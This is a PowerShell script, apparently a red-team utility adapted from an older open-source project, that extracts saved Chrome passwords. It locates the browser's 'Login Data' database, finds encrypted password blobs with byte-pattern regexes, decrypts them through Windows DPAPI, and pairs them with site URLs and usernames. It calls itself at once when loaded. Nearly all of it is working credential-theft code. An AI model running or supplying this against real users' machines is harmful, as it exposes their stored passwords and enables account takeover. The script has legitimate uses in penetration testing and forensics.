# Content:  	Extract stored credentials from Chrome
# Author:   	Florian Hansemann | @HanseSecure | https://hansesecure.de
# Source:	Chrome extraction imported from https://github.com/sekirkity/BrowserGather (project seems dead)
# Fixes:	Chrome Credential extraction fixed and cookie extraction deleted (buggy)
# Date:		04/2018

# ToDo:		three arrays output && only username


function Get-ChromeCreds() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}

	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# First the magic bytes for the password. Ends using the "http" for the next entry.
	$PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$PwdNum = 0
	$DecPwdArray = @()
	$PwdMatchCount = $PwdMatches.Count
	
	# Decrypt the password macthes and put them in an array
	Foreach ($Pwd in $PwdMatches) {
		$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum])
		$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt)
		$DecPwdArray += $DecPwd
		$PwdNum += 1
	}

	# Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]{2,3}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	$UserMatches = $UserRegex.Matches($BinaryText)
	$UserNum = 0
	$UserMatchCount = $UserMatches.Count
	$UserArray = @()
	
	# Check to see if number of users matches the number of passwords. If the values are different, very likely that there was a regex mismatch.
	# All returned values should be treated with caution if this error is presented. May be out of order.
	
	if (-NOT ($UserMatchCount -eq $PwdMatchCount)) { 
	$Mismatch = [string]"The number of users is different than the number of passwords! This is most likely due to a regex mismatch."
	Write-Error $Mismatch
	}
	
	# Add back the "http" used in the regex lookahead
	$HTTP = "http"
	# Put the URL/User matches into an array
	Foreach ($User in $UserMatches) {
		$User = $Encoding.GetBytes($UserMatches[$UserNum])
		$User = $HTTPEnc + $User
		$UserString = [System.Text.Encoding]::Default.GetString($User)
		$UserString = $HTTP + $UserString
		$UserArray += $UserString
		$UserNum += 1
	}
	

	# Now create an object to store the previously created arrays
	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	for ($i = 0; $i -lt $UserNum; $i++) {
		$ObjectProp = @{
			UserURL = $UserArray[$i]
			Password = $DecPwdArray[$i]
			User = $UserArray[$i].split("/")[-1]
		}
	
		$obj = New-Object PSObject -Property $ObjectProp
		$ArrayFinal.Add($obj) | Out-Null
	}
	$ArrayFinal
}
Get-ChromeCreds;
